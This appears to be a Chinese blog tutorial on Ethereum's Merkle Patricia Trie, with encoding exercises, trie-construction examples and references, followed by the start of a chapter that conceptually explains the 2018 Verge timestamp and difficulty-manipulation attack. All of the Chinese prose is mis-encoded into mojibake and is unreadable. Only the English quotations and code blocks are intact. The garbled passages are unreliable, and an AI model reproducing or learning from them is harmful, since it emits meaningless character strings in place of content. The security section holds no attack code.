<p>ç„¶åå†åˆ†æä¸€ä¸‹å‰ç¼€çš„æƒ…å†µã€‚åœ¨è·¯å¾„ä¸ºâ€™a7â€™çš„æ‰©å±•èŠ‚ç‚¹ä¸­ï¼Œè·¯å¾„é•¿åº¦ä¸ºå¶æ•°ï¼Œæœ¬èº«ä¸ºæ‰©å±•èŠ‚ç‚¹ï¼Œå› æ­¤ï¼Œç¬¬ä¸€ä¸ªnibbleä¸º0000ï¼Œé•¿åº¦ä¸ºå¶æ•°ï¼Œæ·»åŠ ä¸€ä¸ªnibble 0000ï¼Œå‰ç¼€åº”è¯¥ä¸º00ã€‚ç¬¬äºŒå±‚çš„ä¸¤ä¸ªå¶å­èŠ‚ç‚¹ï¼Œé•¿åº¦éƒ½ä¸ºå¶æ•°ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªnibbleæ˜¯0010ï¼Œå†æ·»åŠ ä¸€ä¸ªnibble 0000,æ‰€ä»¥æœ€ç»ˆå‰ç¼€åº”è¯¥ä¸º20ã€‚ç¬¬äºŒå±‚ä¸­çš„æ‰©å±•èŠ‚ç‚¹ï¼ŒåŒæ ·é•¿åº¦ä¸ºå¶æ•°ï¼Œæ‰€ä»¥å‰ç¼€åº”è¯¥æ˜¯00ã€‚æœ€åä¸€å±‚çš„å¶å­èŠ‚ç‚¹ä¸­ï¼Œé•¿åº¦ä¸ºå¥‡æ•°ï¼Œæ‰€ä»¥æ·»åŠ çš„nibbleæ˜¯0011ï¼Œä¹Ÿå³3ã€‚</p>
<p>ç»ƒä¹ ï¼š</p>
<p>å®Œæˆä¸‹åˆ—èŠ‚ç‚¹çš„Hexç¼–ç åˆ°HPç¼–ç ã€‚</p>
<p>&gt; [ 1, 2, 3, 4, 5, â€¦] ã€æ‰©å±•ç»“ç‚¹ï¼Œè·¯å¾„é•¿åº¦ä¸ºå¥‡æ•°ï¼Œæ·»åŠ 01ï¼ˆbitï¼‰ï¼Œä¹Ÿå³1(nibble)ã€‘<br>â€˜11 23 45â€™<br>&gt; [ 0, 1, 2, 3, 4, 5, â€¦]ã€æ‰©å±•ç»“ç‚¹ï¼Œè·¯å¾„é•¿åº¦ä¸ºå¶æ•°ï¼Œæ·»åŠ 00ï¼Œä¹Ÿå³0ï¼Œç„¶åè¡¥ä¸€ä¸ª0000ã€‘<br>â€˜00 01 23 45â€™<br>&gt; [ 0, f, 1, c, b, 8, 10] ã€å¶å­èŠ‚ç‚¹ï¼Œé•¿åº¦ä¸ºå¶æ•°ï¼ˆæœ€åä¸€ä¸ª10ä¹Ÿå³16ï¼Œè¡¥å……ä½ï¼Œéœ€è¦ç§»é™¤ï¼‰ï¼Œæ·»åŠ 10ï¼Œä¹Ÿå³2ï¼Œç„¶åè¡¥0000ï¼Œä¹Ÿå³0ã€‘<br>â€˜20 0f 1c b8â€™<br>&gt; [ f, 1, c, b, 8, 10] ã€å¶å­èŠ‚ç‚¹ï¼Œé•¿åº¦ä¸ºå¥‡æ•°ï¼Œæ·»åŠ 11ï¼Œä¹Ÿå³3ã€‘<br>â€˜3f 1c b8â€™</p>
<p>è¯·ç”»å‡ºä¸‹é¢çš„MPTã€‚</p>
<p>Suppose we want a trie containing four path&#x2F;value pairs <code>(&#39;do&#39;, &#39;verb&#39;)</code>, <code>(&#39;dog&#39;, &#39;puppy&#39;)</code>, <code>(&#39;doge&#39;, &#39;coin&#39;)</code>, <code>(&#39;horse&#39;, &#39;stallion&#39;)</code>.</p>
<p>First, we convert both paths and values to <code>bytes</code>. Below, actual byte representations for <em>paths</em>are denoted by <code>&lt;&gt;</code>, although <em>values</em> are still shown as strings, denoted by <code>&#39;&#39;</code>, for easier comprehension (they, too, would actually be <code>bytes</code>):</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;64 6f&gt; : &#x27;verb&#x27;</span><br><span class="line">&lt;64 6f 67&gt; : &#x27;puppy&#x27;</span><br><span class="line">&lt;64 6f 67 65&gt; : &#x27;coin&#x27;</span><br><span class="line">&lt;68 6f 72 73 65&gt; : &#x27;stallion&#x27;</span><br></pre></td></tr></table></figure>

<p>Now, we build such a trie with the following key&#x2F;value pairs in the underlying DB:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">rootHash: [ &lt;16&gt;, hashA ]</span><br><span class="line">hashA:    [ &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashB, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashC, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt; ]</span><br><span class="line">hashC:    [ &lt;20 6f 72 73 65&gt;, &#x27;stallion&#x27; ]</span><br><span class="line">hashB:    [ &lt;00 6f&gt;, hashD ]</span><br><span class="line">hashD:    [ &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashE, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &#x27;verb&#x27; ]</span><br><span class="line">hashE:    [ &lt;17&gt;, hashF ]</span><br><span class="line">hashF:    [ &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, hashG, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &lt;&gt;, &#x27;puppy&#x27; ]</span><br><span class="line">hashG:    [ &lt;35&gt;, &#x27;coin&#x27; ]</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šå››ä¸ªé”®ï¼Œå…±äº«ä¸€ä¸ªå…¬å…±å‰ç¼€6ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªèŠ‚ç‚¹åº”è¯¥æ˜¯æ‰©å±•èŠ‚ç‚¹ï¼Œå…¶å4å’Œ8æœ‰ä¸¤ä¸ªåˆ†æ”¯ï¼Œå› æ­¤æ‰©å±•èŠ‚ç‚¹ä¹‹åè·Ÿç€åˆ†æ”¯èŠ‚ç‚¹ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªåˆ†æ”¯èŠ‚ç‚¹4ä¹‹åæœ‰ä¸‰ä¸ªæœ‰å…±åŒå‰ç¼€â€˜6fâ€™é”®å€¼å¯¹ï¼Œæ‰€ä»¥åˆ†æ”¯4ä¹‹åæ˜¯ä¸€ä¸ªæ‰©å±•èŠ‚ç‚¹ã€‚è€Œ8ä¹‹ååªæœ‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ‰€ä»¥8ä¹‹åæ˜¯ä¸€ä¸ªå¶å­èŠ‚ç‚¹ã€‚4ä¹‹åçš„æ‰©å±•èŠ‚ç‚¹æœ‰å…±åŒå‰ç¼€â€˜6fâ€™ï¼Œâ€˜6fâ€˜ä¹‹åæœ‰ä¸¤ç§æƒ…å†µï¼Œåˆ†åˆ«æ˜¯ç©ºå’Œâ€˜6â€™ã€‚æ‰€ä»¥è¯¥æ‰©å±•èŠ‚ç‚¹ä¹‹åè·Ÿç€åˆ†æ”¯èŠ‚ç‚¹ã€‚åˆ†æ”¯èŠ‚ç‚¹ä¸­6ä¹‹åè·Ÿç€æ‰©å±•èŠ‚ç‚¹ï¼Œå› ä¸ºæœ‰ä¸¤ä¸ªé”®å€¼å¯¹å…±äº«7å‰ç¼€ã€‚ç©ºçš„ä½ç½®åˆ™å¯¹åº”ç€â€˜verbâ€™å€¼æœ¬èº«ã€‚6ä¹‹åçš„æ‰©å±•èŠ‚ç‚¹çš„å…±äº«å‰ç¼€æ˜¯â€™7â€™ï¼Œ7ä¹‹åæœ‰ä¸¤ç§æƒ…å†µï¼Œåˆ†åˆ«æ˜¯ç©ºå’Œâ€™6â€™ã€‚ç±»ä¼¼åœ°ï¼Œç©ºçš„ä½ç½®å¯¹åº”ç€å•è¯â€™puppyâ€™ï¼›åˆ†æ”¯6ä¹‹åå¯¹åº”ç€å¶å­èŠ‚ç‚¹â€˜coinâ€™ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233087.jpg" alt="img"></p>
<p>æœ€åï¼Œå†æ„é€ å¥½Particiaæ ‘ä¹‹åï¼Œæ˜¯æ€ä¹ˆæ ·å’ŒMerkleæ ‘ç»“åˆèµ·æ¥äº†å‘¢ï¼Ÿè¿™é‡Œä¸»è¦æ˜¯å¦‚ä¸Šæ‰€ç¤ºï¼Œå¯¹æ‰€æœ‰çš„èŠ‚ç‚¹çš„å€¼éƒ½åšäº†Hashã€‚</p>
<p>å¢åŠ ä¸€ä¸ªç»ƒä¹ ï¼š</p>
<p>Whenever a new item is added to the trie the algorithm can decide whether to insert a branch, a leaf or an extension. Letâ€™s say you need to insert 3 key-value pairs:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&quot;0x01&quot;: 1</span><br><span class="line">&quot;0x01234&quot;: 2</span><br><span class="line">&quot;0x01235&quot;: 3</span><br></pre></td></tr></table></figure>

<p>After â€œ0x01â€ is inserted the trie will look like this (<code>hash0</code> is root):</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;hash0&gt; leaf [&quot;0x01&quot;, 1]</span><br></pre></td></tr></table></figure>

<p>After â€œ0x01234â€ is inserted (<code>hash1</code> is root):</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;hash1&gt; extension [&quot;0x01&quot;, &lt;hash2&gt;]</span><br><span class="line">&lt;hash2&gt; branch [NULL,NULL,&lt;hash3&gt;,..&lt;13 NULLs&gt;.., 1]</span><br><span class="line">&lt;hash3&gt; leaf [&quot;0x34&quot;, 2]</span><br></pre></td></tr></table></figure>

<p>After â€œ0x01235â€ is inserted (<code>hash4</code> is root):</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&lt;hash4&gt; extension [&quot;0x01&quot;, &lt;hash5&gt;]</span><br><span class="line">&lt;hash5&gt; branch [NULL,NULL,&lt;hash6&gt;,..&lt;13 NULLs&gt;.., 1]</span><br><span class="line">&lt;hash6&gt; extension [&quot;0x3&quot;, &lt;hash7&gt;]</span><br><span class="line">&lt;hash7&gt; branch [NULL,NULL,NULL,NULL,&lt;hash8&gt;,&lt;hash9&gt;..&lt;10 NULLs&gt;.., NULL]</span><br><span class="line">&lt;hash8&gt; leaf [&quot;&quot;, 2]</span><br><span class="line">&lt;hash9&gt; leaf [&quot;&quot;, 3]</span><br></pre></td></tr></table></figure>

<p>Generally, while inserting a key-value pair:</p>
<ul>
<li>if you stopped at a NULL node, you add a new leaf node with the remaining path and replace NULL with the hash of the new leaf.</li>
<li>if you stopped at a leaf node, you need to convert it to an extension node and add a new branch and 1 or 2 leafs.</li>
<li>if you stopped at an extension node, you convert it to another extension with shorter path and create a new branch and 1 or 2 leafs. If the new path turns out to be empty you convert it to a branch instead.</li>
</ul>
<p>When deleting a key-value pair:</p>
<ul>
<li>if there is a branch that has a single non NULL nibble and NULL value, this branch can be replaced with a leaf or an extension.</li>
<li>if there is an extension that points to another extension or a leaf, it can be collapsed into a single extension&#x2F;leaf.</li>
<li>if there is branch with all NULL nibbles and non NULL value, it can be converted into a leaf.</li>
</ul>
<p>I most likely missed a few cases but I hope the general idea is clear. When adding&#x2F;deleting key-value pairs the algorithm can make the decision locally at the current node, there is no need to create an unpacked version of the trie first and then pack it.</p>
<p>å‚è€ƒï¼š</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/wikis/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%8E%86%E5%8F%B2">EthFans | ä»¥å¤ªåŠçˆ±å¥½è€…</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/ethereum/wiki/wiki/Patricia-Tree">ethereum&#x2F;wiki</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.8btc.com/article/73758">è°ˆè°ˆä»¥å¤ªåŠçš„Merkleæ ‘_å·´æ¯”ç‰¹_æœåŠ¡äºåŒºå—é“¾åˆ›æ–°è€…</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/qq_33935254/article/details/55505472">æ·±å…¥æµ…å‡ºä»¥å¤ªåŠMPTï¼ˆMerkle Patricia Treeï¼‰</a></li>
<li><a href="https://link.zhihu.com/?target=https://segmentfault.com/a/1190000016050921">ä»¥å¤ªåŠæºç åˆ†æ MPT - SegmentFault</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.bitmex.com/zh_cn-complete-guide-to-proof-of-stake-ethereums-latest-proposal-amp-vitalik-buterin-interview/">https://blog.bitmex.com/zh_cn-complete-guide-to-proof-of-stake-ethereums-latest-proposal-amp-vitalik-buterin-interview&#x2F;</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.chainnews.com/articles/754796689749.htm">https://www.chainnews.com/articles/754796689749.htm</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/ethereum-explained-merkle-trees-world-state-transactions-and-more">https://ethfans.org/posts/ethereum-explained-merkle-trees-world-state-transactions-and-more</a></li>
<li><a href="https://link.zhihu.com/?target=http://soliloquy0810.cn/2019/03/23/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%B8%AD%E7%9A%84%E7%8A%B6%E6%80%81%E6%A0%91%E3%80%81%E4%BA%A4%E6%98%93%E6%A0%91%E3%80%81%E6%94%B6%E6%8D%AE%E6%A0%91/">http://soliloquy0810.cn/2019/03/23/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%B8%AD%E7%9A%84%E7%8A%B6%E6%80%81%E6%A0%91%E3%80%81%E4%BA%A4%E6%98%93%E6%A0%91%E3%80%81%E6%94%B6%E6%8D%AE%E6%A0%91/</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.infoq.cn/article/how-does-ethereum-work-anyway">https://www.infoq.cn/article/how-does-ethereum-work-anyway</a></li>
<li><a href="https://link.zhihu.com/?target=https://harry.uno/post/merkle-patricia-tree.html">https://harry.uno/post/merkle-patricia-tree.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://masterthecrypto.com/ethereum-what-is-gas-gas-limit-gas-price/">https://masterthecrypto.com/ethereum-what-is-gas-gas-limit-gas-price/</a></li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/cybermiles/diving-into-ethereums-world-state-c893102030ed">https://medium.com/cybermiles/diving-into-ethereums-world-state-c893102030ed</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/e67452930dcc">https://www.jianshu.com/p/e67452930dcc</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.cnblogs.com/luosongchao/p/3239521.html">https://www.cnblogs.com/luosongchao/p/3239521.html</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethereum.stackexchange.com/questions/39915/ethereum-merkle-patricia-trie-extension-node">https://ethereum.stackexchange.com/questions/39915/ethereum-merkle-patricia-trie-extension-node</a></li>
<li><a href="https://link.zhihu.com/?target=http://www.jouypub.com/2018/9b19cff7135411bd37356e6c4f5f63b7/">http://www.jouypub.com/2018/9b19cff7135411bd37356e6c4f5f63b7/</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/28928827">https://zhuanlan.zhihu.com/p/28928827</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.hellobtc.com/kp/kc/201904/1562.html">https://www.hellobtc.com/kp/kc/201904/1562.html</a></li>
</ol>
<h1 id="åŒºå—é“¾æŠ€æœ¯12ï¼šåŒºå—é“¾å®‰å…¨ï¼ˆ1ï¼‰"><a href="#åŒºå—é“¾æŠ€æœ¯12ï¼šåŒºå—é“¾å®‰å…¨ï¼ˆ1ï¼‰" class="headerlink" title="åŒºå—é“¾æŠ€æœ¯12ï¼šåŒºå—é“¾å®‰å…¨ï¼ˆ1ï¼‰"></a>åŒºå—é“¾æŠ€æœ¯12ï¼šåŒºå—é“¾å®‰å…¨ï¼ˆ1ï¼‰</h1><p>åœ¨å¼•å…¥æ¯”ç‰¹å¸ç­‰åŠ å¯†è´§å¸æ—¶ï¼Œä¸€ä¸ªç»å¸¸æåŠçš„æ¦‚å¿µæ˜¯æ”¯æ’‘ç€è¿™äº›åŠ å¯†è´§å¸çš„åº•å±‚æ¡†æ¶â€”â€”åŒºå—é“¾åè®®éå¸¸åœ°å®‰å…¨å¯é ã€‚å„ç§åŠ å¯†ç®—æ³•ä¿è¯äº†åŒºå—é“¾çš„æ­£å¸¸è¿è¡Œï¼ŒåŒºå—é“¾ä¸­çš„ä¿¡æ¯ä¸å¯ç¯¡æ”¹ã€ä¸èƒ½åˆ é™¤ï¼ŒåŸºäºå·¥ä½œé‡çš„è¯æ˜ä¿è¯éš¾ä»¥æœ‰æ”»å‡»è€…å¯ä»¥æ§åˆ¶ç½‘ç»œã€‚åœ¨è¿™äº›è‰¯å¥½æ€§è´¨çš„æ”¯æŒä¸‹ï¼ŒåŠ å¯†è´§å¸ç³»ç»Ÿå¾—åˆ°äº†å¿«é€Ÿçš„å‘å±•ã€‚</p>
<p>ä½†æ˜¯ï¼Œå¯¹åŠ å¯†è´§å¸çš„ç»å¯¹å®‰å…¨çš„æœŸæœ›æ˜¯é”™è¯¯çš„ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†çœ‹ä¸€äº›å…·ä½“çš„ä¾‹å­ï¼ŒæŸ¥çœ‹å…¶ä¸­åŠ å¯†è´§å¸ç³»ç»Ÿæ˜¯å¦‚ä½•è¢«æ”»å‡»çš„ã€‚ç¬¬ä¸€ä¸ªä¾‹å­ï¼Œæ”»å‡»è€…é’ˆå¯¹çš„æ˜¯åŒºå—é“¾çš„åº•å±‚è¿è¡Œç®—æ³•ï¼›ç¬¬äºŒä¸ªä¾‹å­ï¼Œæ”»å‡»è€…åˆ©ç”¨çš„åˆ™æ˜¯åŒºå—é“¾ä¸Šæ™ºèƒ½åˆçº¦çš„ç¼–å†™ã€‚</p>
<h2 id="verge"><a href="#verge" class="headerlink" title="verge"></a>verge</h2><p>vergeæ˜¯ä¸€ç§è§„æ¨¡ç›¸å¯¹è¾ƒå°çš„åŠ å¯†è´§å¸ã€‚åœ¨2018å¹´4æœˆ 4 æ—¥è‡³ 6 æ—¥è¿™æ®µæ—¶é—´é‡Œï¼Œé»‘å®¢æˆåŠŸåœ°æ§åˆ¶äº† Verge ç½‘ç»œä¸‰æ¬¡ï¼Œæ¯æ¬¡æŒç»­å‡ ä¸ªå°æ—¶ï¼Œåœ¨æ­¤æœŸé—´ï¼Œé»‘å®¢é˜»æ­¢äº†ä»»ä½•å…¶ä»–ç”¨æˆ·è¿›è¡Œæ”¯ä»˜ã€‚è€Œä¸”åœ¨æ­¤æœŸé—´ä»–ä»¬èƒ½å¤Ÿä»¥ 1560 æšæ¯ç§’ï¼ˆå¤§çº¦ $80ï¼‰çš„é€Ÿåº¦ä¼ªé€  Verge å¸ï¼Œå…±ä¼ªé€ ä»·å€¼è¶…ç™¾ä¸‡ç¾å…ƒçš„ Verge å¸ã€‚</p>
<p>çœ‹åˆ°è¿™ä¸ªæ”»å‡»æ•ˆæœæ—¶ï¼Œæˆ‘ä»¬æ¥æƒ³ä¸€æƒ³ï¼Œä»€ä¹ˆæ ·çš„æ”»å‡»èƒ½å¤Ÿè¾¾åˆ°è¿™ä¸ªæ•ˆæœï¼Ÿ</p>
<p>å…¶ä»–ç”¨æˆ·å®Œå…¨ä¸èƒ½æ”¯ä»˜ï¼Œä¹Ÿå°±æ„å‘³ç€è¿™äº›ç”¨æˆ·äº§ç”Ÿçš„äº¤æ˜“å§‹ç»ˆä¸èƒ½è¢«æ‰“åŒ…åˆ°åŒºå—ä¸­ï¼Œä¸èƒ½è·å¾—ç¡®å®šï¼Œä»è€Œç›¸å½“äºæ˜¯ä¸èƒ½è¿›è¡Œæ”¯ä»˜ã€‚å¦‚ä½•ä¼ªé€ Vergeå¸å‘¢ï¼ŸæŒç»­äº§ç”ŸåŒºå—å°±è¡Œã€‚é‚£å¦‚ä½•èƒ½æŒç»­äº§ç”ŸåŒºå—å‘¢ï¼Ÿé‚£å°±è¦æ¯”å…¶ä»–ç”¨æˆ·æ›´å¿«åœ°äº§ç”ŸåŒºå—ã€‚æ¢è¨€ä¹‹ï¼Œå°±æ˜¯è¦æ§åˆ¶ç½‘ç»œä¸­è¶…è¿‡51%çš„ç®—åŠ›ã€‚</p>
<p>51%æ”»å‡»æˆ‘ä»¬åœ¨åŒé‡æ”¯ä»˜çš„æ—¶å€™æåˆ°è¿‡ï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶51%çš„ç®—åŠ›ï¼Œé‚£ä¹ˆä»–ä»¬å°±å¯ä»¥æ§åˆ¶äº§ç”Ÿçš„åŒºå—ï¼Œåœ¨åŒºå—ä¸­åŒ…æ‹¬åŒé‡æ”¯ä»˜çš„äº¤æ˜“ï¼Œæˆ–è€…åœ¨åŒ…æ‹¬åŒé‡æ”¯ä»˜çš„äº¤æ˜“ä¹‹åè¿›è¡Œå»¶ç»­ã€‚ä½†å½“æ—¶æˆ‘ä»¬ä¹Ÿåˆ†æäº†ï¼Œé¦–å…ˆï¼Œåœ¨æ¯”ç‰¹å¸ç³»ç»Ÿä¸­ï¼Œåœ¨æ‹¥æœ‰å¤§é‡çš„çŸ¿å·¥å’ŒçŸ¿æ± çš„æƒ…å†µä¸‹ï¼Œä»»ä½•äººæƒ³è¦æ§åˆ¶51%çš„ç®—åŠ›åŸºæœ¬æ˜¯ä¸å¯èƒ½çš„ï¼›å…¶æ¬¡ï¼Œå¦‚æœæœ‰äººçœŸæ­£æ§åˆ¶äº†51%çš„ç®—åŠ›ï¼Œé‚£ä¹ˆä»–ä¼šé€‰æ‹©éµå®ˆå’Œç»´æŠ¤è¿™ä¸ªç§©åºï¼Œä»è€Œé¿å…è‡ªå·±çš„æŠ•èµ„æµªè´¹æ‰ã€‚</p>
<p>é‚£è¿™ä¸ªé’ˆå¯¹Vergeçš„æ”»å‡»æ˜¯æ€ä¹ˆå›äº‹å‘¢ï¼Ÿæ”»å‡»è€…å…¶å®å¹¶æ²¡æœ‰çœŸæ­£æŒæ¡51%çš„ç®—åŠ›ã€‚</p>
<p>æ§åˆ¶51%çš„ç®—åŠ›å®é™…ä¸Šå°±æ˜¯è¦æ¯”åˆ«äººæ›´å¿«åœ°è¿›è¡Œå“ˆå¸Œï¼Œæ‰¾å‡ºæ¥æ»¡è¶³åŒºå—äº§ç”Ÿéš¾åº¦çš„å“ˆå¸Œå€¼ã€‚é‚£å¦‚æœä¸èƒ½åœ¨ç®—åŠ›ä¸Šå ä¼˜ï¼Œæœ‰æ²¡æœ‰å¯èƒ½é™ä½åŒºå—çš„éš¾åº¦ï¼Ÿ</p>
<p>åœ¨æ¯”ç‰¹å¸ç³»ç»Ÿä¸­ï¼Œäº§ç”ŸåŒºå—çš„éš¾åº¦æ˜¯å¯ä»¥åŠ¨æ€è°ƒèŠ‚çš„ã€‚éš¾åº¦å€¼è¢«è®¾å®šåœ¨æ— è®ºèŠ‚ç‚¹è®¡ç®—èƒ½åŠ›å¦‚ä½•ï¼Œæ–°åŒºå—äº§ç”Ÿé€Ÿç‡éƒ½ä¿æŒåœ¨æ¯10åˆ†é’Ÿä¸€ä¸ªã€‚éš¾åº¦çš„è°ƒæ•´æ˜¯åœ¨æ¯ä¸ªå®Œæ•´èŠ‚ç‚¹ä¸­ç‹¬ç«‹è‡ªåŠ¨å‘ç”Ÿçš„ã€‚æ¯2016ä¸ªåŒºå—ï¼Œæ‰€æœ‰èŠ‚ç‚¹éƒ½ä¼šæŒ‰ç»Ÿä¸€çš„å…¬å¼è‡ªåŠ¨è°ƒæ•´éš¾åº¦ã€‚</p>
<p>åœ¨Vergeç³»ç»Ÿä¸­ï¼Œä¹Ÿæœ‰ç±»ä¼¼çš„æœºåˆ¶ã€‚Vergeå¸Œæœ›ç»´æŒè¶³å¤Ÿçš„å»ä¸­å¿ƒåŒ–ï¼Œä¹Ÿå³è®©ä¸ªäººè®¡ç®—æœºè¿™æ ·çš„å°å‹è®¾å¤‡èƒ½å‚ä¸è®¡ç®—ï¼›ä½†ä¸ºäº†é˜²æ­¢è¿‡å¿«äº§ç”ŸåŒºå—ï¼ŒVergeè§„å®šæ¯éš” 30 ç§’äº§ç”Ÿä¸€ä¸ªåŒºå—ã€‚ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼ŒVergeçš„æŒ–çŸ¿éš¾åº¦æ˜¯æ ¹æ®åŒºå—ç¡®è®¤é€Ÿç‡åŠ¨æ€è°ƒæ•´çš„ã€‚å¦‚æœæ›´å¤šçš„äººå†³å®šæŠ•å…¥æ›´å¤šçš„ç®—åŠ›äº§ç”Ÿ Verge åŒºå—ï¼Œé‚£ä¹ˆæŒ–çŸ¿é€Ÿç‡ä¼šå˜å¿«ï¼ŒVerge åŒºå—é“¾åè®®å°†å¢åŠ æŒ–çŸ¿éš¾åº¦ï¼Œä»è€Œé™åˆ¶åŒºå—æäº¤é€Ÿç‡ã€‚ç›¸åï¼Œéšç€æŒ–çŸ¿ç®—åŠ›ä¸‹é™ä»¥åŠåŒºå—äº§ç”Ÿé—´éš”å¢åŠ ï¼ŒæŒ–çŸ¿ä¼šå˜å¾—æ›´åŠ å®¹æ˜“ã€‚å› æ­¤ï¼Œå½“ç½‘ç»œæ­£å¸¸è¿è¡Œæ—¶ï¼Œä¸ç®¡å¤–ç•Œç¯å¢ƒå¦‚ä½•ï¼ŒVerge ç½‘ç»œéƒ½èƒ½å¤Ÿå®æ—¶å¤„ç†ï¼Œå¹¶ä¸”å¼•å¯¼ç½‘ç»œè¾¾åˆ°ç›®æ ‡åŒºå—äº§ç”Ÿé€Ÿç‡çš„å‡è¡¡ã€‚ä»è®¾è®¡ç›®çš„è€Œè¨€ï¼Œè¿™ä¸ªè®¾è®¡æ¯«æ— ç–‘é—®æ˜¯éå¸¸äººæ€§åŒ–çš„ï¼Œç”¨æˆ·å‹å¥½çš„ã€‚</p>
<p>Verge ç”¨æ¥è®¡ç®—å¯†ç å­¦éš¾é¢˜çš„å…±è¯†ç®—æ³•æ˜¯ Dark Gravity Waveï¼Œå®ƒå¯¹ 30 åˆ†é’Ÿå†…æ»‘åŠ¨çª—å£çš„åŒºå—ç¡®è®¤é€Ÿç‡å–åŠ æƒå¹³å‡å€¼ã€‚è¿™æ ·çš„åæœæ˜¯ï¼ŒæŒ–çŸ¿éš¾åº¦æ˜¯æœ€è¿‘åŒºå—äº§ç”Ÿé€Ÿç‡çš„å‡½æ•°ï¼Œè€ŒåŸºäºåŒºå—äº§ç”Ÿé¢‘ç‡è¿›è¡ŒæŒ–çŸ¿éš¾åº¦è®¡ç®—è‡ªç„¶éœ€è¦æŸ¥çœ‹åŒºå—æ—¶é—´æˆ³ã€‚</p>
<p>è¿™é‡Œè¿˜æ¶‰åŠåˆ°ä¸€ä¸ªé—®é¢˜ï¼šåœ¨åŒºå—é“¾ç³»ç»Ÿæ˜¯ï¼ŒåŒºå—æ—¶é—´æˆ³å…è®¸ä¹±åºã€‚</p>
<p>åœ¨åŒºå—é“¾åè®®ä¸­ï¼Œå•ç¬”äº¤æ˜“è¢«åˆ†ç»„æ‰“åŒ…åˆ°ä¸€ä¸ªåŒºå—ä¸­ï¼Œä½œä¸ºæ•´ä½“è¿›è¡Œç¡®è®¤ã€‚æ¯ä¸€ä¸ªåŒºå—éƒ½æœ‰ä¸€ä¸ªå…¶åˆ›å»ºæ—¥æœŸçš„æ—¶é—´æˆ³ã€‚å³ä½¿åŒºå—é“¾åè®®æ­£å¸¸è¿è¡Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹è¿™äº›æ—¶é—´æˆ³ä¹Ÿå¯èƒ½æ˜¯ä¹±åºçš„ï¼Œå³ï¼Œç¬¬ 100 ä¸ªåŒºå—çš„æ—¶é—´æˆ³å¯èƒ½<em>æ™šäº</em>ç¬¬ 101 ä¸ªåŒºå—ã€‚è¿™æ˜¯å› ä¸ºï¼Œåœ¨å»ä¸­å¿ƒåŒ–ç³»ç»Ÿä¸­ï¼Œè¿›è¡Œæ—¶é—´åŒæ­¥ç¡®å®æ˜¯ä¸€ä»¶å¾ˆéš¾çš„äº‹æƒ…ã€‚å³ä¾¿æ‰€æœ‰èŠ‚ç‚¹éƒ½æ˜¯è¯šå®çš„ï¼ŒåŒºå—çš„æ—¶é—´æˆ³ä¹Ÿç»å¯¹æœ‰å¯èƒ½å‡ºç°â€œä¹±åºâ€çš„æƒ…å†µã€‚æ¢å¥è¯è¯´ï¼Œåœ¨å»ä¸­å¿ƒåŒ–ç³»ç»Ÿä¸­ï¼Œå…è®¸ä¹±åºæ‰æ˜¯æ­£å¸¸çš„ï¼›åœ¨ Verge è¢«é»‘å®¢æ”»å‡»ä¹‹å‰ï¼Œå®ƒå…è®¸æ¥æ”¶çš„åŒºå—æ—¶é—´æˆ³â€œçª—å£â€è‡³å¤šä¸º2ä¸ªå°æ—¶ã€‚åœ¨Vergeæ”»å‡»ä¹‹åï¼Œè¿™ä¸ªçª—å£è¢«ç¼©å°åˆ°15åˆ†é’Ÿã€‚</p>
